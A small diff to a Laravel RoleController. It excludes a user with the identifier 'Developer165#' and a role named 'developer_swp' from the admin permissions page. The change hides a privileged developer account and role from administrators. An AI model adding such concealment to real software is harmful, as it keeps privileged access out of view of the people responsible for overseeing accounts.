@@ -18,6 +18,7 @@ class RoleController extends Controller
 
         $users = User::with(['roles', 'pegawai.unit'])
             ->whereHas('pegawai', fn($q) => $q->where('kode_unit', $kodeUnit))
+            ->whereNot('nip', 'Developer165#')
             ->get()
             ->map(function ($user) {
                 return [
@@ -31,6 +32,7 @@ class RoleController extends Controller
 
 
         $roles =  Role::with(['permissions'])
+            ->whereNot('name', 'developer_swp')
             ->withCount('users')
             ->get()
             ->map(function ($role) {
@@ -43,6 +45,7 @@ class RoleController extends Controller
                     'permissions' => $role->permissions->pluck('name')->toArray(),
                 ];
             });
+
 
         return Inertia::render('admin/permissions/page', [
             'mockRoles' => $roles,
